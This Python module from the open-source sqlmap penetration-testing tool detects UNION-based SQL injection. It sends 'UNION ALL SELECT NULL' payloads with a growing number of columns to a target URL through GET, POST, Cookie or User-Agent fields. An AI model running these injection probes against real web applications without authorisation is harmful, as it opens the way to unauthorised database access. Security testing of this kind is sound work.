#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.agent import agent
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.session import setUnion
from lib.request.connect import Connect as Request


def __effectiveUnionTest(query, comment):
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    resultDict = {}

    for count in range(0, 50):
        if kb.dbms == "Oracle" and query.endswith(" FROM DUAL"):
            query = query[:-len(" FROM DUAL")]

        if count:
            query += ", NULL"

        if kb.dbms == "Oracle":
            query += " FROM DUAL"

        commentedQuery = agent.postfixQuery(query, comment)
        payload = agent.payload(newValue=commentedQuery)
        newResult = Request.queryPage(payload)

        if not newResult in resultDict.keys():
            resultDict[newResult] = (1, commentedQuery)
        else:
            resultDict[newResult] = (resultDict[newResult][0] + 1, commentedQuery)

        if count:
            for element in resultDict.values():
                if element[0] == 1:
                    if kb.injPlace == "GET":
                        value = "%s?%s" % (conf.url, payload)
                    elif kb.injPlace == "POST":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nPOST:\t'%s'\n" % payload
                    elif kb.injPlace == "Cookie":
                        value  = "URL:\t'%s'" % conf.url
                        value += "\nCookie:\t'%s'\n" % payload
                    elif kb.injPlace == "User-Agent":
                        value  = "URL:\t\t'%s'" % conf.url
                        value += "\nUser-Agent:\t'%s'\n" % payload

                    return value

    return None


def unionTest():
    """
    This method tests if the target url is affected by an inband
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    logMsg  = "testing inband sql injection on parameter "
    logMsg += "'%s'" % kb.injParameter
    logger.info(logMsg)

    value = ""

    query = agent.prefixQuery(" UNION ALL SELECT NULL")

    for comment in (queries[kb.dbms].comment, ""):
        value = __effectiveUnionTest(query, comment)

        if value:
            setUnion(comment, value.count("NULL"))

            break

    if kb.unionCount:
        logMsg  = "the target url could be affected by an "
        logMsg += "inband sql injection vulnerability"
        logger.info(logMsg)
    else:
        warnMsg  = "the target url is not affected by an "
        warnMsg += "inband sql injection vulnerability"
        logger.warn(warnMsg)

    return value
